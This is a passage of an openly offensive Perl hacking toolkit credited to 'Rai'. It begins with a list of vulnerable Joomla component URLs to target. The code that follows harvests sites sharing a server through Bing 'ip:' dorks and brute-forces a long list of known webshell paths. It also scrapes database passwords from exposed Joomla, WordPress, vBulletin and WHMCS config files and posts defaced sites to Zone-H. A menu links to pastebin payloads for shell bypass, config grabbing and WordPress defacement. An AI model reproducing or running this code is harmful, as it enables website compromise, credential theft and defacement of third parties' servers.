index.php?option=com_flashmagazinedeluxe
index.php?option=com_bookjoomlas
index.php?option=com_juser
index.php?option=com_moofaq
index.php?option=com_portafolio
index.php?option=com_projectfork
index.php?option=com_tickets
index.php?option=com_joomloads
index.php?option=com_ninjamonial
index.php?option=com_jtips
index.php?option=com_artportal
index.php?option=com_joomlub
index.php?option=com_joomloc
index.php?option=com_djcatalog
index.php?option=com_foobla_suggestions
index.php?option=com_reservations
index.php?option=com_chronoconnectivity
index.php?option=com_djartgallery
index.php?option=com_jmarket
index.php?option=com_jcommunity
index.php?option=com_cinema
index.php?option=com_answers
index.php?option=com_galleryxml
index.php?option=com_frontpage
index.php?option=com_google_maps
index.php?option=com_image
index.php?option=com_photos
index.php?option=com_picasa2gallery
index.php?option=com_ybggal
index.php?option=com_jcafe
index.php?option=com_jejob
index.php?option=com_sef
index.php?option=jesubmit
index.php?option=com_projectlog
index.php?option=com_reportcard
index.php?option=com_artforms
index.php?option=com_jomholiday
index.php?option=com_ownbiblio
index.php?option=com_tag
index.php?option=com_commedia
index.php?option=com_conference
index.php?option=com_realty
index.php?option=com_sobi2
index.php?option=com_jomdirectory
index.php?option=com_bnf
index.php?option=com_sport
index.php?option=com_personal
index.php?option=com_play
index.php?option=com_etree
index.php?option=com_file
index.php?option=com_bca-rss-syndicator
index.php?option=com_ckforms
index.php?option=com_datafeeds
index.php?option=com_fabrik
index.php?option=com_ganalytics
index.php?option=com_gcalendar
index.php?option=com_hsconfig
index.php?option=com_if_surfalert
index.php?option=com_janews
index.php?option=com_jfeedback
index.php?option=com_joomlapicasa2
index.php?option=com_jshopping
index.php?option=com_jvehicles
index.php?option=com_linkr
index.php?option=com_mmsblog
index.php?option=com_mscomment
index.php?option=com_ninjarsssyndicator
index.php?option=com_onlineexam
index.php?option=com_orgchart
index.php?option=com_properties
index.php?option=com_rpx
index.php?option=com_sectionex
index.php?option=com_simpledownload
index.php?option=com_userstatus
index.php?option=com_aquiz
index.php?option=com_as
index.php?option=com_as_shop
index.php?option=com_msg
index.php?option=com_club
modules/mod_simplefileuploadv1.3


put all this in file txt === > rai.txt then run script again and choose 1
");

}
if($targett eq '5')
{
spyx1();
sub spyx1(){
srand(time() ^ ($$ + ($$ << 15)));
print "Welcome to the ip Genrator how much ip u want ?\n";
my $ipnumspy = <STDIN>;
chomp $ipnumspy;

for (1..$ipnumspy){
    print $spx = join ('.', (int(rand(255))
                     ,int(rand(255))
                     ,int(rand(255))
                     ,int(rand(255))))

          , "\n";
      open(save, '>>chen3a.txt');
    print save "$spx\n";
    close(save);

}
}
}

else{
print color("red"), "Not Found\n";
print color('reset');
}
##############################
sub gett(){
$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
for ($i = 1; $i <= 255; $i+=1){
$ips ="$a.$b.$c.$i";
OUTER: foreach $ip($ips){
print color("red"), " [IP] > [$ips]\n";
print color ('reset');
        open (TEXT, '>>ipsdumpdv3.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();

}
minibot();
open HANDLE,">","tov1.txt";
print HANDLE "";
close HANDLE;


}
}
#############################
sub get(){

$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
$ips="$a.$b.$c.$d";
print " [IP] > [$ips]\n";
        open (TEXT, '>>ipsdumpdv3.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();
minibot();


}
####################################"
sub gassone(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(save, '>>urldumpdv3.txt');
    print save "$link\n";
    close(save);

print "$link\n";
open(savea, '>>tov1.txt');
    print savea "$link\n";
    close(savea);
  

            push(@result,$link);
          }
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
next OUTER;

open HANDLE,">","tov1.txt";
print HANDLE "";
close HANDLE;}
}
}
###########
sub gassonee(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(save, '>>urldumpdv3.txt');
    print save "$link\n";
    close(save);
            push(@result,$link);
          }
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
exit;
}
}
}
}
sub minibot(){
open(tarrget,"tov1.txt") or die "$!";
while(<tarrget>){
chomp($_);
$site = $_;
filter();
open HANDLE,">","tov1.txt";
print HANDLE "";
close HANDLE;

}
}



sub shellfinder(){
print color('bold red');
print q(
                          Shell Finder
                        Coded By Rai
                         
        [+]===================[!]===================[+]
                
);
print color('reset');
									   brute();

 
sub brute(){ 
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
brutespy();
}
}
sub brutespy($site){


	

 
 
@path = ('wso.php','css/1/jou.php','FARES.php','fares.php','WSO.php','dz.php','w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','shell.php','cpanel.php','cpn.php','sql.php','mysql.php','config.php','configuration.php','madspot.php','Cgishell.pl','killer.php','changeall.php','2.php','Sh3ll.php','dz0.php','dam.php','user.php','dom.php','whmcs.php','r00t.php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.php','settings.php','tmp.php','cyber.php','c99.php','r57.php','404.php','gaza.php','1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sniper.php','ksa.php','v4team.php','offline.php','priv8.php','911.php','madspotshell.php','c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php','tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php','templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php','tmp/readme.php','wp.zip'.'wp-content/plugins/disqus-comment-system/disqus.php',
'd0mains.php','wp-content/plugins/akismet/akismet.php','madspotshell.php','info.php','egyshell.php','Sym.php','c22.php','c100.php',
'wp-content/plugins/akismet/admin.php#','configuration.php','g.php','wp-content/plugins/google-sitemap-generator/sitemap-core.php#',
'wp-content/plugins/akismet/widget.php#','xx.pl','ls.php','Cpanel.php','k.php','zone-h.php','tmp/user.php','tmp/Sym.php','cp.php',
'tmp/madspotshell.php','tmp/root.php','tmp/whmcs.php','tmp/index.php','tmp/2.php','tmp/dz.php','tmp/cpn.php',
'tmp/changeall.php','tmp/Cgishell.pl','tmp/sql.php','0day.php','tmp/admin.php','cliente/downloads/h4xor.php',
'whmcs/downloads/dz.php','L3b.php','d.php','tmp/d.php','tmp/L3b.php','wp-content/plugins/akismet/admin.php',
'templates/rhuk_milkyway/index.php','templates/beez/index.php','sado.php','admin1.php','upload.php','up.php','vb.zip','vb.rar',
'admin2.asp','uploads.php','sa.php','sysadmins/','admin1/','sniper.php','administration/Sym.php','images/Sym.php',
'/r57.php','/wp-content/plugins/disqus-comment-system/disqus.php','gzaa_spysl','sql-new.php','/shell.php','/sa.php','/admin.php',
'/sa2.php','/2.php','/gaza.php','/up.php','/upload.php','/uploads.php','/templates/beez/index.php','shell.php','/amad.php',
'/t00.php','/dz.php','/site.rar','/Black.php','/site.tar.gz','/home.zip','/home.rar','/home.tar','/home.tar.gz',
'/forum.zip','/forum.rar','/forum.tar','/forum.tar.gz','/test.txt','/ftp.txt','/user.txt','/site.txt','/error_log','/error',
'/cpanel','/awstats','/site.sql','/vb.sql','/forum.sql','r00t-s3c.php','c.php','/backup.sql','/back.sql','/data.sql','wp.rar/',
'wp-content/plugins/disqus-comment-system/disqus.php','asp.aspx','/templates/beez/index.php','tmp/vaga.php',
'tmp/killer.php','whmcs.php','abuhlail.php','tmp/killer.php','tmp/domaine.pl','tmp/domaine.php','useradmin/',
'tmp/d0maine.php','d0maine.php','tmp/sql.php','X.php','123.php','m.php','b.php','up.php','tmp/dz1.php','dz1.php','forum.zip','Symlink.php','Symlink.pl',
'forum.rar','joomla.zip','joomla.rar','wp.php','buck.sql','sysadmin.php','images/c99.php', 'xd.php', 'c100.php',
'spy.aspx','xd.php','tmp/xd.php','sym/root/home/','billing/killer.php','tmp/upload.php','tmp/admin.php',
'Server.php','tmp/uploads.php','tmp/up.php','Server/','wp-admin/c99.php','tmp/priv8.php','priv8.php','cgi.pl/',
'tmp/cgi.pl','downloads/dom.php','templates/ja-helio-farsi/index.php','webadmin.html','admins.php',
'/wp-content/plugins/count-per-day/js/yc/d00.php','bluff.php','king.jeen','admins/','admins.asp','admins.php','wp.zip','/wp-content/plugins/disqus-comment-system/WSO.php',);
 
foreach $myshell(@path){
 
$shellzspy = $site.'/'.$myshell;
$req = HTTP::Request->new(GET=>$shellzspy);
$useragent = LWP::UserAgent->new();
 
$response = $useragent->request($req);
 
if ($response->is_success){
print "Shell Found Ya Spy : $shellzspy\n";
 open(save, '>>Shellbruterai.txt');
    print save "$shellzspy\n";
	    close(save);

}else{
print "Failed Ya Spy : $myshell\n";
}
}
}
}

sub toolzi(){
print color('bold red');
print q(
                              Tools
                        Coded By Rai
                         
        [+]===================[!]===================[+]
                
);
print color('reset');
print color('bold red'),"[";
print color('bold green'),"1";
print color('bold red'),"] ";
print color('bold white'),"Shell Bypass Rai v1\n";
print color('bold blue'),"https://pastebin.com/raw/aKQDB9JK\n";
print color('bold red'),"[";
print color('bold green'),"2";
print color('bold red'),"] ";
print color('bold white'),"Wordpress Pass Change\n";
print color('bold blue'),"https://pastebin.com/raw/CbxJi6V3\n";
print color('bold red'),"[";
print color('bold green'),"3";
print color('bold red'),"] ";
print color('bold white'),"Config Grabber\n";
print color('bold blue'),"https://pastebin.com/raw/aKQDB9JK\n";
print color('bold red'),"[";
print color('bold green'),"4";
print color('bold red'),"] ";
print color('bold white'),"Deface Wp from Config\n";
print color('bold blue'),"https://pastebin.com/raw/w8tYAQyb\n";
print color('bold red'),"[";
print color('bold green'),"5";
print color('bold red'),"] ";
print color('bold white'),"FMailer Script By Rai\n";
print color('bold blue'),"https://pastebin.com/raw/4KZCTZ0L\n";
print color('reset');
}

sub zonehposter(){

sub dumperpassx(){
passdumper();
sub passdumper(){
print "Config Links File.txt  : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
tazpassdumper();


}
}
sub tazpassdumper(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
my $cont = $ua->get("$site")->content;

# // Fuck Off kids  Spy always a geniuses   //


  print color('reset');

        if ($cont =~ /password = \'(.*?)\';/){ #jm
		print color('bold green');
        print "\t Pass = $1 -Joomla \n";
	    print color('reset');
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  } elsif ($cont =~ /'DB_PASSWORD\', \'(.*)\'/){ #wordpress
  	    print color('bold red');
        print "\t Pass = $1  - wordpress\n";
	    print color('reset');
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  } elsif ($cont =~ /password_localhost = "(.*)"/){ #conexao.php
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /password\'] = \'(.*)/){ #vb
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /db_password = "(.*)"/){ #whmcs
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /db_pwd =  "(.*)"/){
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /config\[\'db_pass\'\] = \'(.*)\'/){
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }
  
else{
print "No Password Found maybe The Config 404 :(";
print "\n";

    }

}
}

print "List of Sites You Want to Post In Zone-h : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$def = $_;
zoneh();
}
}
